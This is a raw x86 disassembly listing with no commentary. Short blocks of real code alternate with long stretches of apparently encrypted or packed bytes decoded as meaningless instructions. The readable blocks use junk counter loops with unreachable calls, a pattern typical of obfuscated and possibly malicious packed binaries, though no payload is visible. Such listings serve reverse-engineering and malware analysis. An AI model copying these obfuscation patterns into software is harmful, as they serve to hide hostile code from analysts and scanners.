  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42b005,edi
  40ed6d:	cmp    DWORD PTR ds:0x42b005,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42af7d
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42af71
  40ed88:	xor    DWORD PTR ds:0x42aff5,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	mov    al,0xe2
  40eda1:	inc    edx
  40eda2:	or     eax,0x7878bf61
  40eda7:	in     eax,0x7e
  40eda9:	js     0x40ee23
  40edab:	(bad)  
  40edac:	inc    edx
  40edad:	test   DWORD PTR [ebx+0x15fa1bfb],0x51d886b7
  40edb7:	pushf  
  40edb8:	push   cs
  40edb9:	lds    eax,FWORD PTR [edi+0x45]
  40edbc:	or     BYTE PTR [eax+0x30c3e3be],0x6e
  40edc3:	fistp  QWORD PTR [eax]
  40edc5:	inc    ebx
  40edc6:	outs   dx,DWORD PTR ds:[esi]
  40edc7:	jmp    0x784fdbf6
  40edcc:	mov    edi,0xcf372773
  40edd1:	jb     0x40ed85
  40edd3:	into   
  40edd4:	shl    DWORD PTR [edx+0x75],0x7d
  40edd8:	dec    ebp
  40edd9:	push   ebp
  40edda:	pushf  
  40eddb:	xlat   BYTE PTR ds:[ebx]
  40eddc:	add    eax,eax
  40edde:	sub    esi,esi
  40ede0:	jae    0x40edfd
  40ede2:	shl    BYTE PTR [ecx+eax*2-0x14],1
  40ede6:	push   edx
  40ede7:	xor    al,0x15
  40ede9:	arpl   WORD PTR [edi+eax*2],cx
  40edec:	lds    ecx,FWORD PTR [ecx+0x26]
  40edef:	jb     0x40ed80
  40edf1:	sahf   
  40edf2:	mov    ch,0x3f
  40edf4:	mov    edi,0xe045a86f
  40edf9:	mul    DWORD PTR [ebx-0x1c]
  40edfc:	mov    BYTE PTR [esi+0x8],dh
  40edff:	add    DWORD PTR [esp+ecx*1-0x7cddede5],esi
  40ee06:	cmp    BYTE PTR [ecx+0x25b14273],dl
  40ee0c:	mov    ds:0xcd8d4754,al
  40ee11:	test   DWORD PTR [esi],0x3f6a8b2a
  40ee17:	(bad)  
  40ee18:	sar    BYTE PTR [edi-0x1c],0x6b
  40ee1c:	test   eax,0x7fa6c96b
  40ee21:	fwait
  40ee22:	shr    BYTE PTR [eax],0x81
  40ee25:	cmc    
  40ee26:	mov    eax,ds:0xd0637f79
  40ee2b:	mov    dh,0x72
  40ee2d:	cmp    DWORD PTR [ebx-0x354d85c8],edx
  40ee33:	pop    esi
  40ee34:	shl    DWORD PTR [eiz*2+0x313aed19],1
  40ee3b:	(bad)  
  40ee3c:	loopne 0x40ee56
  40ee3e:	ins    DWORD PTR es:[edi],dx
  40ee3f:	fistp  QWORD PTR [edi-0x35]
  40ee42:	push   ds
  40ee43:	mov    BYTE PTR [ebp+0x172c6f7a],dh
  40ee49:	or     eax,0x992084a6
  40ee4e:	adc    eax,0xd151a166
  40ee53:	shl    BYTE PTR [edx-0x57f683ca],1
  40ee59:	sub    eax,0x6bb73a3a
  40ee5e:	cwde   
  40ee5f:	outs   dx,BYTE PTR ds:[esi]
  40ee60:	dec    ecx
  40ee61:	popf   
  40ee62:	in     al,dx
  40ee63:	jbe    0x40ee6a
  40ee65:	dec    ecx
  40ee66:	inc    ebp
  40ee67:	(bad)  
  40ee68:	in     eax,dx
  40ee69:	test   DWORD PTR [ebp+0x58dd72f6],ecx
  40ee6f:	inc    ebx
  40ee70:	aas    
  40ee71:	daa    
  40ee72:	mov    WORD PTR [ecx-0x357b94f1],cs
  40ee78:	fwait
  40ee79:	jmp    0x40ee12
  40ee7b:	aaa    
  40ee7c:	cmp    BYTE PTR [edi+edx*4-0x1c24cef9],dh
  40ee83:	lea    edi,[edx]
  40ee85:	in     al,0x2d
  40ee87:	and    ah,BYTE PTR ds:0xfc7d11e
  40ee8d:	in     al,0xa
  40ee8f:	sub    BYTE PTR [ecx+ebp*8],0xd2
  40ee93:	ret    
  40ee94:	std    
  40ee95:	sbb    ch,BYTE PTR [eax]
  40ee97:	xchg   edx,eax
  40ee98:	jle    0x40ee1b
  40ee9a:	lds    ecx,FWORD PTR [ebx+0x73]
  40ee9d:	xchg   BYTE PTR [eax-0x30],al
  40eea0:	lea    edx,[esi]
  40eea2:	lock std 
  40eea4:	aas    
  40eea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eea6:	xor    ebp,eax
  40eea8:	je     0x40eede
  40eeaa:	ins    BYTE PTR es:[edi],dx
  40eeab:	lahf   
  40eeac:	nop
  40eead:	inc    ebp
  40eeae:	mov    WORD PTR [esi],?
  40eeb0:	sbb    dl,dl
  40eeb2:	in     al,0xb9
  40eeb4:	stos   DWORD PTR es:[edi],eax
  40eeb5:	xchg   ebp,eax
  40eeb6:	sub    BYTE PTR [ebp-0x43365465],bh
  40eebc:	sub    al,0x7b
  40eebe:	cwde   
  40eebf:	add    bl,BYTE PTR [ecx]
  40eec1:	pop    edi
  40eec2:	adc    bh,ch
  40eec4:	(bad)  
  40eec7:	xchg   ecx,eax
  40eec8:	pop    ds
  40eec9:	jns    0x40eef4
  40eecb:	pop    eax
  40eecc:	push   esp
  40eecd:	jge    0x40eefe
  40eecf:	sbb    al,0xb3
  40eed1:	sub    ah,dh
  40eed3:	jb     0x40ef1b
  40eed5:	cwde   
  40eed6:	leave  
  40eed7:	es add al,0xe3
  40eeda:	test   eax,0x64146df0
  40eedf:	cmp    BYTE PTR [ebx],bh
  40eee1:	adc    al,0xd5
  40eee3:	dec    esi
  40eee4:	loope  0x40ee94
  40eee6:	inc    ebx
  40eee7:	add    eax,DWORD PTR [ecx+edi*8]
  40eeea:	fild   WORD PTR [ebx+0x52]
  40eeed:	pop    es
  40eeee:	mov    eax,ds:0xca2c4d9e
  40eef3:	jle    0x40eed8
  40eef5:	ins    DWORD PTR es:[edi],dx
  40eef6:	pusha  
  40eef7:	cmp    bl,0xbe
  40eefa:	cmp    dl,BYTE PTR [ebx+esi*1]
  40eefd:	in     eax,dx
  40eefe:	mov    esp,0x3ad33734
  40ef03:	mov    dh,0xa
  40ef05:	lds    eax,FWORD PTR [ebx]
  40ef07:	lahf   
  40ef08:	daa    
  40ef09:	ficom  WORD PTR [esi]
  40ef0b:	sub    eax,0xb21d4a47
  40ef10:	ret    
  40ef11:	mov    esi,fs
  40ef13:	mov    WORD PTR [edx-0xf415d71],?
  40ef19:	mov    esi,DWORD PTR [edx-0x73426888]
  40ef1f:	popf   
  40ef20:	stos   DWORD PTR es:[edi],eax
  40ef21:	xor    DWORD PTR [ecx+0x5c214fa4],edx
  40ef27:	pop    ebp
  40ef28:	pop    ecx
  40ef29:	pop    edi
  40ef2a:	clc    
  40ef2b:	test   BYTE PTR [ebp+0x79bc831f],bh
  40ef31:	dec    ecx
  40ef32:	and    dh,ch
  40ef34:	jle    0x40ef92
  40ef36:	jl     0x40ef91
  40ef38:	cmp    BYTE PTR [edx+0x1890a28d],ch
  40ef3e:	mov    ch,bl
  40ef40:	inc    ecx
  40ef41:	mov    dh,0x4e
  40ef43:	and    dh,BYTE PTR [eax-0x2d8805dd]
  40ef49:	jge    0x40ef38
  40ef4b:	ja     0x40efb9
  40ef4d:	pop    edx
  40ef4e:	xor    eax,0xcde40e52
  40ef53:	or     eax,0xf55a4f05
  40ef58:	mov    edx,0xfcb3c5c1
  40ef5d:	(bad)  
  40ef5e:	sti    
  40ef5f:	fdivr  DWORD PTR [ecx]
  40ef61:	lock fisub DWORD PTR [eax+ecx*4]
  40ef65:	inc    ecx
  40ef66:	(bad)  
  40ef67:	cmc    
  40ef68:	mov    edi,0xc5b1314c
  40ef6d:	rol    esi,cl
  40ef6f:	mov    ebx,0xa40d24a2
  40ef74:	pop    edi
  40ef75:	or     eax,0xbef88ca9
  40ef7a:	pop    ss
  40ef7b:	fidiv  DWORD PTR [ebx-0x58]
  40ef7e:	popa   
  40ef7f:	xchg   BYTE PTR [esi-0x3c132b56],dh
  40ef85:	mov    dh,0x9e
  40ef87:	fs pop ecx
  40ef89:	call   0xdda9:0xdca3a18f
  40ef90:	pop    bx
  40ef92:	jno    0x40f007
  40ef94:	add    edi,DWORD PTR fs:[esi]
  40ef97:	mov    eax,0xcd9ed6da
  40ef9c:	cmc    
  40ef9d:	sbb    edx,DWORD PTR [esi+eax*1+0x38a1bd54]
  40efa4:	add    eax,0x156f94d4
  40efa9:	in     eax,0x80
  40efab:	out    dx,al
  40efac:	mov    dh,0x8c
  40efae:	daa    
  40efaf:	sbb    DWORD PTR [edi+0x15],ebx
  40efb2:	retf   0x8a9d
  40efb5:	and    dl,BYTE PTR [ebx+ebp*8-0x7c]
  40efb9:	fistp  QWORD PTR [esi]
  40efbb:	in     al,dx
  40efbc:	fdiv   QWORD PTR [edi-0x6b04493]
  40efc2:	call   0x1679:0x636a4435
  40efc9:	test   eax,0xf1586e82
  40efce:	popa   
  40efcf:	in     eax,0xf3
  40efd1:	and    eax,0x54b13a
  40efd6:	test   BYTE PTR [esi-0x48299035],bh
  40efdc:	adc    al,0xa4
  40efde:	stc    
  40efdf:	dec    ebx
  40efe0:	das    
  40efe1:	mov    dh,0xca
  40efe3:	das    
  40efe4:	mov    al,ds:0xab177eda
  40efe9:	xor    eax,0xd9770091
  40efee:	pop    ecx
  40efef:	imul   ebp,DWORD PTR [eax-0x29960d70],0xffffffb5
  40eff6:	sbb    DWORD PTR [ebx-0x4f7f7761],ebp
  40effc:	cmc    
  40effd:	xor    BYTE PTR [edi-0x12ef36c4],al
  40f003:	loop   0x40f00e
  40f005:	aaa    
  40f006:	xor    DWORD PTR [edi+0x78a27fa7],esi
  40f00c:	out    dx,al
  40f00d:	out    dx,al
  40f00e:	xlat   BYTE PTR ds:[ebx]
  40f00f:	frstor [ebx]
  40f011:	or     al,0x2a
  40f013:	mov    esi,0x5589b65d
  40f018:	clc    
  40f019:	and    DWORD PTR ds:0x42af81,0x0
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42af81
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42af81,edi
  40f032:	cmp    DWORD PTR ds:0x42af81,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42af81,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42af81
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42af81,edi
  40f066:	cmp    DWORD PTR ds:0x42af81,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42b00d,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42b00d
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42b00d,edi
  40f08f:	cmp    DWORD PTR ds:0x42b00d,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42af85
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42b00d,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42aed9,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0x1a
  40f0d7:	sub    al,0x29
  40f0d9:	xchg   ebx,eax
  40f0da:	into   
  40f0db:	mov    esp,0x7ee57878
  40f0e0:	js     0x40f15a
  40f0e2:	xor    eax,0x9044c41
  40f0e7:	sbb    edx,eax
  40f0e9:	std    
  40f0ea:	mov    dl,0x10
  40f0ec:	jno    0x40f0f9
  40f0ee:	sahf   
  40f0ef:	aad    0xdd
  40f0f1:	and    ch,cl
  40f0f3:	aaa    
  40f0f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0f5:	test   BYTE PTR [eax-0x81a554b],0xa8
  40f0fc:	les    ebp,FWORD PTR [ebp-0x30e66c6b]
  40f102:	dec    esp
  40f103:	push   cs
  40f104:	outs   dx,BYTE PTR ds:[esi]
  40f105:	mov    BYTE PTR [esi-0x78],cl
  40f108:	jmp    0x8901563
  40f10d:	loope  0x40f09a
  40f10f:	xchg   edi,eax
  40f110:	into   
  40f111:	retf   0x4977
  40f114:	push   cs
  40f115:	(bad)  
  40f116:	gs and eax,0x6d4496e4
  40f11c:	imul   edi,ebx,0x11
  40f11f:	xor    eax,0x42b3f107
  40f124:	outs   dx,DWORD PTR ds:[esi]
  40f125:	sbb    edx,DWORD PTR [esi]
  40f127:	ja     0x40f11d
  40f129:	pop    esp
  40f12a:	and    al,0xf5
  40f12c:	jmp    0x40f156
  40f12e:	arpl   WORD PTR [esi+0x3d],si
  40f131:	push   ecx
  40f132:	xor    bl,BYTE PTR [edi]
  40f134:	xchg   ecx,eax
  40f135:	fld    TBYTE PTR [edi]
  40f137:	xor    BYTE PTR [ebp-0x74],cl
  40f13a:	ins    BYTE PTR es:[edi],dx
  40f13b:	push   esi
  40f13c:	or     BYTE PTR [ebp+0x67459],0x72
  40f143:	pop    ebx
  40f144:	or     eax,0xbe6f5e5e
  40f149:	clc    
  40f14a:	repz cmp BYTE PTR [ebx+ecx*1-0x2d],bh
  40f14f:	mov    cl,0x42
  40f151:	mov    ds:0x7a6ed5c8,eax
  40f156:	mov    al,BYTE PTR ds:[esi+ebp*1+0x7f]
  40f15b:	fnstcw WORD PTR [eax]
  40f15d:	mov    edi,0xf687a011
  40f162:	je     0x40f18f
  40f164:	mov    bh,0xcc
  40f166:	mov    eax,ds:0x89769efa
  40f16b:	mov    ebx,0x1883db61
  40f170:	pop    edx
  40f171:	add    eax,0x46cadd4
  40f176:	iret   
  40f177:	into   
  40f178:	clc    
  40f179:	mov    eax,0xa8232583
  40f17e:	and    al,0x56
  40f180:	jmp    0x9a59:0x398dfa8f
  40f187:	test   BYTE PTR [ecx+0x58],cl
  40f18a:	test   BYTE PTR [ebp+0x4a],al
  40f18d:	push   esp
  40f18e:	inc    esp
  40f18f:	adc    DWORD PTR [esi-0x28],ecx
  40f192:	js     0x40f1c6
  40f194:	jle    0x40f1e0
  40f196:	jmp    0x40f1ec
  40f198:	jecxz  0x40f1e1
  40f19a:	xchg   BYTE PTR ds:0xc1101e37,cl
  40f1a0:	pop    ss
  40f1a1:	or     BYTE PTR [edi],bl
  40f1a3:	mov    ch,0x1e
  40f1a5:	push   0xffffffbf
  40f1a7:	pop    ss
  40f1a8:	(bad)  
  40f1a9:	mov    ecx,0x224ae7c7
  40f1ae:	dec    edx
  40f1af:	imul   edi,edx,0xc945d73f
  40f1b5:	xchg   edx,eax
  40f1b6:	bound  ebx,QWORD PTR [ecx-0x6f]
  40f1b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1ba:	push   esp
  40f1bb:	mov    esi,0x8764da9c
  40f1c0:	out    0x4e,eax
  40f1c2:	push   0x7cb5c138
  40f1c7:	pop    esp
  40f1c8:	xor    al,0x64
  40f1ca:	(bad)  [edx+ebx*1-0x3b]
  40f1ce:	jmp    0x40f24a
  40f1d0:	inc    esp
  40f1d1:	inc    esp
  40f1d2:	or     DWORD PTR [ebx*2+0x1a52a504],edx
  40f1d9:	out    0x33,al
  40f1db:	xchg   edx,eax
  40f1dc:	in     eax,dx
  40f1dd:	iret   
  40f1de:	fdivr  DWORD PTR [edi-0x73]
  40f1e1:	out    dx,eax
  40f1e2:	shl    BYTE PTR [esi],0x71
  40f1e5:	outs   dx,DWORD PTR ds:[esi]
  40f1e6:	xchg   ecx,eax
  40f1e7:	jle    0x40f226
  40f1e9:	sub    BYTE PTR [edx+0x53],0xd8
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	mov    edi,0x492825f8
  40f1f3:	addr16 adc al,0xab
  40f1f6:	addr16 sti 
  40f1f8:	pusha  
  40f1f9:	repz rcr DWORD PTR [edx+ecx*1],cl
  40f1fd:	jecxz  0x40f188
  40f1ff:	ror    BYTE PTR [eax],cl
  40f201:	mov    ebx,DWORD PTR [ebx]
  40f203:	test   eax,0x94697ca3
  40f208:	scas   eax,DWORD PTR es:[edi]
  40f209:	push   ss
  40f20a:	jp     0x40f18d
  40f20c:	(bad)  
  40f20d:	and    edx,ebx
  40f20f:	(bad)  
  40f210:	ins    BYTE PTR es:[edi],dx
  40f211:	int    0xc9
  40f213:	mov    ecx,0xa7ccc7d2
  40f218:	inc    ebp
  40f219:	int3   
  40f21a:	mov    ah,0x96
  40f21c:	and    al,0x55
  40f21e:	push   ebx
  40f21f:	adc    al,0xbb
  40f221:	stos   DWORD PTR es:[edi],eax
  40f222:	loopne 0x40f27d
  40f224:	leave  
  40f225:	out    dx,eax
  40f226:	pop    ebp
  40f227:	movaps xmm4,XMMWORD PTR [ecx-0x16c51f1b]
  40f22e:	inc    ecx
  40f22f:	cmp    DWORD PTR [esi+0x72a082fc],esi
  40f235:	jo     0x40f2ac
  40f237:	or     DWORD PTR [edi+0x70],edx
  40f23a:	sbb    dh,bh
  40f23c:	test   ebx,ebx
  40f23e:	out    dx,eax
  40f23f:	mov    ebp,0xc890026
  40f244:	dec    ebp
  40f245:	mov    bl,0x8d
  40f247:	les    eax,FWORD PTR [ebx-0x25]
  40f24a:	dec    DWORD PTR [eax-0x7f]
  40f24d:	push   0x891c42a1
  40f252:	or     al,0xcc
  40f254:	and    dh,dl
  40f256:	out    0x4,al
  40f258:	pop    ss
  40f259:	out    dx,al
  40f25a:	push   esp
  40f25b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f25c:	jecxz  0x40f282
  40f25e:	pop    es
  40f25f:	jge    0x40f279
  40f261:	call   0x46a3:0x5617c57a
  40f268:	mov    dl,0x7a
  40f26a:	push   0xe84384e3
  40f26f:	ins    DWORD PTR es:[edi],dx
  40f270:	xor    bl,BYTE PTR [ebp+0x63]
  40f273:	sub    ch,ah
  40f275:	mov    dl,0x35
  40f277:	sar    BYTE PTR [ecx-0x57],cl
  40f27a:	stc    
  40f27b:	pop    eax
  40f27c:	in     eax,dx
  40f27d:	(bad)  
  40f27e:	sbb    ecx,ecx
  40f280:	jge    0x40f29e
  40f282:	cmp    esi,ebx
  40f284:	jg     0x40f29b
  40f286:	fs dec edx
  40f288:	rcr    BYTE PTR [ebx-0x56],1
  40f28b:	inc    ebp
  40f28c:	clc    
  40f28d:	adc    DWORD PTR [eax-0x685d7c4d],0x87572b67
  40f297:	scas   al,BYTE PTR es:[edi]
  40f298:	int3   
  40f299:	ret    0x693f
  40f29c:	les    edx,FWORD PTR [esi-0x9]
  40f29f:	nop
  40f2a0:	inc    esi
  40f2a1:	and    esp,DWORD PTR [ecx]
  40f2a3:	retf   0x8e78
  40f2a6:	clc    
  40f2a7:	test   BYTE PTR [eax],dh
  40f2a9:	mov    ebp,0x20ab0baf
  40f2ae:	and    cl,BYTE PTR [ecx+0x66]
  40f2b1:	repnz mov edi,0xc8848835
  40f2b7:	add    al,0x7b
  40f2b9:	cld    
  40f2ba:	mov    dl,0x9a
  40f2bc:	(bad)  
  40f2bd:	stos   DWORD PTR es:[edi],eax
  40f2be:	push   ebx
  40f2bf:	mov    BYTE PTR [ecx+edi*1+0x324b48a6],0x86
  40f2c7:	xor    ch,dh
  40f2c9:	gs test ch,dh
  40f2cc:	ins    DWORD PTR es:[edi],dx
  40f2cd:	out    0x63,eax
  40f2cf:	repz std 
  40f2d1:	xchg   ecx,eax
  40f2d2:	or     al,0x6c
  40f2d4:	xor    bl,dh
  40f2d6:	mov    tr1,ecx
  40f2d9:	cmp    ebp,esp
  40f2db:	js     0x40f274
  40f2dd:	jmp    FWORD PTR [ecx]
  40f2df:	adc    eax,0x5fb7cad9
  40f2e4:	adc    ebp,DWORD PTR [esi-0x2a99574d]
  40f2ea:	pop    edi
  40f2eb:	fimul  DWORD PTR [edi]
  40f2ed:	cld    
  40f2ee:	imul   ebp,ebx,0xffffffba
  40f2f1:	mov    BYTE PTR [ebp+0x1e],0x76
  40f2f5:	push   eax
  40f2f6:	lahf   
  40f2f7:	arpl   di,bp
  40f2f9:	nop
  40f2fa:	inc    ebp
  40f2fb:	xor    al,0xe4
  40f2fd:	aam    0xb1
  40f2ff:	push   0xe35ad196
  40f304:	mov    esi,0xa915cb90
  40f309:	add    BYTE PTR [edx+0x3ebecd71],bl
  40f30f:	mov    edi,0xce49ec82
  40f314:	aam    0x1a
  40f316:	pop    ebx
  40f317:	in     eax,dx
  40f318:	pop    edx
  40f319:	outs   dx,BYTE PTR ds:[esi]
  40f31a:	test   BYTE PTR [ebx+edi*1],dl
  40f31d:	sub    al,0x39
  40f31f:	(bad)  
  40f321:	sbb    al,0x46
  40f323:	leave  
  40f324:	out    dx,al
  40f325:	lods   eax,DWORD PTR ds:[esi]
  40f326:	pop    ecx
  40f327:	outs   dx,BYTE PTR ds:[esi]
  40f328:	cmp    ch,BYTE PTR [esi-0x44]
  40f32b:	pop    ecx
  40f32c:	fs mov esi,0x59958ff
  40f332:	mov    WORD PTR [esi],gs
  40f334:	xor    al,0xa0
  40f336:	inc    edx
  40f337:	sbb    al,0xbc
  40f339:	fcmovnbe st,st(7)
  40f33b:	fcmovbe st,st(6)
  40f33d:	sbb    ebx,DWORD PTR [eax*8+0x5d9de285]
  40f344:	retf   
  40f345:	pop    edi
  40f346:	call   0xe42a4f14
  40f34b:	inc    eax
  40f34c:	retf   0xd103
  40f34f:	mov    DWORD PTR ds:0x42af8d,0x1d
  40f359:	cmp    DWORD PTR ds:0x42af8d,0x0
  40f360:	je     0x40f3c3
  40f366:	cmp    DWORD PTR ds:0x42af8d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42af8d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42af8d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42af8d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42af8d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42af8d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42aed9
  40f3bd:	add    DWORD PTR ds:0x42aef5,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42aee9
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42afc1,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42afc1
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42afc1,edx
  40f3f8:	cmp    DWORD PTR ds:0x42afc1,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42afc1,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42aff9
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42aef5,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42af89,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42af89
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42af89,edx
  40f477:	cmp    DWORD PTR ds:0x42af89,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42af89,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42af49,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42af49,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42af49,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42af49
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42af49,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42afc1,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42afc1
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42afc1,edi
  40f528:	cmp    DWORD PTR ds:0x42afc1,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42afc1,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42af4d
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42afb1,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	rol    ebx,0x8d
  40f573:	pop    edx
  40f574:	outs   dx,BYTE PTR ds:[esi]
  40f575:	mov    ebx,0xe5787842
  40f57a:	jle    0x40f5f4
  40f57c:	js     0x40f5c1
  40f57e:	push   esi
  40f57f:	ins    BYTE PTR es:[edi],dx
  40f580:	mov    bl,al
  40f582:	push   es
  40f583:	mov    bh,0xb2
  40f585:	nop
  40f586:	mov    bl,0x47
  40f588:	xor    cl,BYTE PTR [ebx+0x59]
  40f58b:	sub    al,0xed
  40f58d:	mov    edi,DWORD PTR [ecx-0x3963cc86]
  40f593:	popf   
  40f594:	or     eax,0x16a93ed6
  40f599:	add    al,0x99
  40f59b:	xchg   edx,eax
  40f59c:	(bad)  
  40f59d:	fidiv  WORD PTR [ecx+0x546fa1cd]
  40f5a3:	aam    0xcc
  40f5a5:	xchg   esi,eax
  40f5a6:	sahf   
  40f5a7:	and    BYTE PTR [esi],0x31
  40f5aa:	clc    
  40f5ab:	xchg   ebp,eax
  40f5ac:	mov    eax,ds:0xaf18d3c9
  40f5b1:	pop    ss
  40f5b2:	daa    
  40f5b3:	xlat   BYTE PTR ds:[ebx]
  40f5b4:	mov    WORD PTR [esi],es
  40f5b6:	fmul   DWORD PTR [edx]
  40f5b8:	test   DWORD PTR [ecx+ebp*8+0x4de1f390],ebx
  40f5bf:	jge    0x40f5fd
  40f5c1:	gs mov bh,0xf8
  40f5c4:	or     ecx,DWORD PTR [eax-0x16]
  40f5c7:	pop    eax
  40f5c8:	adc    edx,DWORD PTR [eax+0x4d]
  40f5cb:	arpl   WORD PTR [esi],cx
  40f5cd:	mov    bh,0x8f
  40f5cf:	das    
  40f5d0:	xchg   bh,ch
  40f5d2:	fsub   DWORD PTR [ecx]
  40f5d4:	in     al,dx
  40f5d5:	fist   DWORD PTR [bp+si-0x4e]
  40f5d9:	es dec esi
  40f5db:	dec    ebp
  40f5dc:	test   al,0xd9
  40f5de:	test   al,0x41
  40f5e0:	mov    cl,0xc
  40f5e2:	shr    DWORD PTR [eax+0x3f],0xf8
  40f5e6:	and    DWORD PTR [ebp-0x62],edx
  40f5e9:	mov    ecx,DWORD PTR [esi+0x63e01881]
  40f5ef:	push   cs
  40f5f0:	repnz push eax
  40f5f2:	ja     0x40f621
  40f5f4:	imul   eax,esi,0xffffff94
  40f5f7:	jnp    0x40f63d
  40f5f9:	cld    
  40f5fa:	mov    ds:0xb30a7365,al
  40f5ff:	inc    edx
  40f600:	mov    dl,0xb0
  40f602:	retf   
  40f603:	repnz int 0xae
  40f606:	cmp    eax,0x853ea637
  40f60b:	in     eax,dx
  40f60c:	inc    ebx
  40f60d:	and    eax,0x40323343
  40f612:	ds enter 0xde3d,0xad
  40f617:	gs and ah,ah
  40f61a:	mov    ah,0xf9
  40f61c:	sub    DWORD PTR [eax],ebp
  40f61e:	and    dl,ch
  40f620:	stos   DWORD PTR es:[edi],eax
  40f621:	push   ss
  40f622:	cmp    cl,bh
  40f624:	lock cs iret 
